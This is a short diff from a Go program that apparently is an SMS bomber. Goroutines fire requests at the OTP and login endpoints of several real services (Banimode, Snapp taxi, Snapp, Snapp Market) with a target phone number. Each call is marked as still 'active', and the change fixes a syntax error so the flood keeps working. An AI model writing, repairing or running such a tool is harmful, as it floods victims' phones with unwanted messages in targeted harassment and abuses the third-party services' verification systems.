@@ -152,13 +152,13 @@ func main() {
 		}, ch)  //active✅
 		go sms("https://mobapi.banimode.com/api/v2/auth/request", map[string]interface{}{
 			"phone": phone,
-		}, ch)  //active✅
+                }, ch)  //active✅
 		go sms("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", map[string]interface{}{
 			"cellphone": phone,
 		}, ch) // active✅
 		go sms("https://api.snapp.ir/api/v1/sms/link", map[string]interface{}{
 			"phone": phone,
-		}, ch  // active✅
+		}, ch) // active✅
 		go sms("https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=0", map[string]interface{}{
 		 	"cellphone": phone,
                 }, ch) // active✅
